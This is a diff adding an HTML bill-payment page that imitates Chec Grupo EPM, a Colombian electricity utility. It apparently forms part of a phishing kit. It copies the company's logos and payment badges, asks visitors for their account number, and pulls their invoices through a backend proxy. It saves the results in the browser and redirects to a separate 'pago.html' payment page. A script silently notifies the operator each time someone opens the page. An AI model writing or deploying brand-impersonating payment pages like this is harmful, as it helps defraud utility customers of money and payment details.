@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago de Factura - Chec Grupo EPM</title>
+    <style>
+        /* --- RESET Y FUENTES --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body, html { height: 100%; width: 100%; background-color: #ffffff; }
+
+        /* --- CONTENEDOR PRINCIPAL (LAYOUT PC) --- */
+        .main-container { display: flex; height: 100vh; width: 100%; overflow: hidden; }
+
+        /* --- COLUMNA IZQUIERDA (FORMULARIO) --- */
+        .left-panel {
+            width: 50%; background-color: #ffffff; display: flex; flex-direction: column;
+            justify-content: space-between; padding: 40px 60px; position: relative; z-index: 2;
+        }
+
+        /* Logos Superiores */
+        .top-logos { display: flex; align-items: center; justify-content: center; gap: 40px; margin-bottom: 20px; }
+        .top-logos img { height: 95px; object-fit: contain; }
+        .logo-chec { height: 130px !important; }
+
+        /* Contenido Central (Formulario) */
+        .form-content {
+            max-width: 480px; width: 100%; margin: 0 auto; text-align: center;
+            flex-grow: 1; display: flex; flex-direction: column; justify-content: center;
+        }
+        .form-content h1 { color: #008f39; font-size: 26px; margin-bottom: 50px; font-weight: 600; }
+
+        /* Input de cuenta */
+        .input-group {
+            display: flex; align-items: center; border-bottom: 2px solid #333;
+            padding-bottom: 5px; margin-bottom: 25px;
+        }
+        .input-icon { width: 22px; height: 22px; color: #666; margin-right: 12px; flex-shrink: 0; }
+        .input-group input { border: none; outline: none; width: 100%; font-size: 16px; color: #333; }
+        .input-group input::placeholder { color: #888; }
+
+        /* Botones */
+        .btn-info {
+            background-color: #9dbb45; color: white; border: none; padding: 10px 45px;
+            border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer;
+            margin-bottom: 20px; transition: background 0.3s;
+        }
+        .btn-info:hover { background-color: #8aa83b; }
+
+        .btn-pagar {
+            background-color: #e0e0e0; color: white; border: none; padding: 15px;
+            width: 100%; border-radius: 30px; font-size: 18px; font-weight: bold;
+            cursor: not-allowed; text-transform: uppercase; transition: background 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .spinner {
+            width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff; border-radius: 50%;
+            animation: spin 0.8s linear infinite; display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Footer (Pagos y PSE) */
+        .footer-info { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .payment-img { height: 20px; object-fit: contain; margin-bottom: 5px; }
+        .footer-info p { font-size: 15px; color: #333; margin-bottom: 5px; }
+        .pse-logo { height: 55px; margin-top: 5px; }
+
+        /* --- COLUMNA DERECHA (IMAGEN PC) --- */
+        .right-panel { width: 50%; position: relative; background-color: #7ab800; display: flex; align-items: center; justify-content: center; }
+        .family-img {
+            width: 100%; height: 100%; object-fit: cover; object-position: center;
+            position: absolute; top: 0; left: 0; z-index: 1;
+        }
+        .green-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(122, 184, 0, 0.6); z-index: 2; mix-blend-mode: multiply;
+        }
+        .logo-overlay-bottom { position: absolute; bottom: 40px; right: 40px; z-index: 3; text-align: right; }
+        .logo-overlay-bottom img { height: 70px; filter: brightness(0) invert(1); }
+
+        /* --- RESPONSIVE (VISTA MÓVIL) --- */
+        @media (max-width: 768px) {
+            .main-container { flex-direction: column; height: auto; min-height: 100vh; }
+            .left-panel { width: 100%; padding: 20px; flex-grow: 1; justify-content: flex-start; }
+            .top-logos { justify-content: center; margin-bottom: 40px; gap: 25px; }
+            .top-logos img { height: 65px; }
+            .logo-chec { height: 85px !important; }
+            .form-content h1 { font-size: 24px; margin-bottom: 50px; line-height: 1.3; }
+            .form-content { margin-bottom: 100px; }
+            .btn-pagar { width: 100%; padding: 15px; font-size: 18px; }
+            .footer-info { margin-top: auto; padding-bottom: 20px; }
+            .right-panel { width: 100%; height: 180px; flex-shrink: 0; position: relative; order: 2; }
+            .family-img { object-position: center 30%; }
+            .logo-overlay-bottom { bottom: 15px; right: 15px; left: 15px; text-align: left; }
+            .logo-overlay-bottom img { height: 45px; }
+            .payment-img { height: 20px; }
+            .pse-logo { height: 50px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+
+        <!-- PANEL IZQUIERDO (Formulario) -->
+        <div class="left-panel">
+            <div class="top-logos">
+                <img src="log1.png" alt="Chec Grupo EPM" class="logo-chec">
+                <img src="log2.png" alt="BIC">
+            </div>
+
+            <div class="form-content">
+                <h1>¡Paga tu factura de energía fácil y rápido!</h1>
+
+                <div class="input-group">
+                    <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                        <polyline points="14 2 14 8 20 8"></polyline>
+                        <line x1="16" y1="13" x2="8" y2="13"></line>
+                        <line x1="16" y1="17" x2="8" y2="17"></line>
+                        <polyline points="10 9 9 9 8 9"></polyline>
+                    </svg>
+                    <input type="text" id="numeroCuenta" placeholder="Ingresa los nueve dígitos de tu número de cuenta" maxlength="9">
+                </div>
+
+                <button class="btn-info">INFO</button>
+                <button class="btn-pagar" id="btnPagar"><span id="btnTexto">IR A PAGAR</span><div class="spinner" id="btnSpinner"></div></button>
+            </div>
+
+            <div class="footer-info">
+                <img src="image.png" alt="Pagos procesados por ePayco" class="payment-img">
+                <p>Medio de pago disponible</p>
+                <img src="pse.png" alt="PSE" class="pse-logo">
+            </div>
+        </div>
+
+        <!-- PANEL DERECHO (Imagen) -->
+        <div class="right-panel">
+            <img src="imagen.png" alt="Familia feliz" class="family-img">
+            <div class="green-overlay"></div>
+            <div class="logo-overlay-bottom">
+                <img src="log1.png" alt="Chec">
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ============================================= -->
+    <!-- SCRIPT DE INTEGRACIÓN CON BACKEND PROXY       -->
+    <!-- ============================================= -->
+    <script>
+        // Notificar ingreso al cargar la página automáticamente
+        async function notificarIngreso() {
+            try {
+                await fetch("/api/notificar-ingreso", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" }
+                });
+            } catch (e) {
+                console.error("Error al notificar ingreso:", e);
+            }
+        }
+        notificarIngreso();
+
+        // Paso 1: Obtener token (via proxy)
+        async function getToken() {
+            var res = await fetch("/api/token", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" }
+            });
+            var data = await res.json();
+            if (data && data.data && data.data.token) return data.data.token;
+            if (data && data.token) return data.token;
+            throw new Error("No se pudo obtener el token");
+        }
+
+        // Paso 2: Consultar facturas (via proxy)
+        async function consultarFacturas(clienteId, token) {
+            var res = await fetch("/api/facturas", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ clienteId: clienteId, token: token })
+            });
+            return await res.json();
+        }
+
+        // Conectar al botón "IR A PAGAR"
+        var btnPagar = document.getElementById('btnPagar');
+        var inputCuenta = document.getElementById('numeroCuenta');
+
+        // Validar input para cambiar color del botón
+        inputCuenta.addEventListener('input', function () {
+            if (this.value.length === 9) {
+                btnPagar.style.backgroundColor = '#008f39';
+                btnPagar.style.cursor = 'pointer';
+            } else {
+                btnPagar.style.backgroundColor = '#e0e0e0';
+                btnPagar.style.cursor = 'not-allowed';
+            }
+        });
+
+        // Evento click del botón
+        btnPagar.addEventListener('click', async function () {
+            var clienteId = inputCuenta.value.trim();
+            if (clienteId.length !== 9) return alert("Ingresa los 9 digitos");
+
+            document.getElementById('btnTexto').textContent = "BUSCANDO";
+            document.getElementById('btnSpinner').style.display = "inline-block";
+            btnPagar.disabled = true;
+
+            try {
+                // 1. Token directo al navegador
+                var token = await getToken();
+
+                // 2. Consultar facturas directo
+                var resultado = await consultarFacturas(clienteId, token);
+
+                // Extraer facturas del resultado
+                var facturas = null;
+                if (resultado && resultado.data) {
+                    facturas = resultado.data;
+                } else if (resultado && resultado.facturas) {
+                    facturas = resultado;
+                }
+
+                if (facturas) {
+                    localStorage.setItem("chec_token", token);
+                    localStorage.setItem("chec_clienteId", clienteId);
+                    localStorage.setItem("chec_facturas", JSON.stringify(facturas));
+                    window.location.href = "pago.html";
+                } else {
+                    alert("No se encontraron facturas para esa cuenta.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("Error: " + error.message);
+            } finally {
+                document.getElementById('btnTexto').textContent = "IR A PAGAR";
+                document.getElementById('btnSpinner').style.display = "none";
+                btnPagar.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
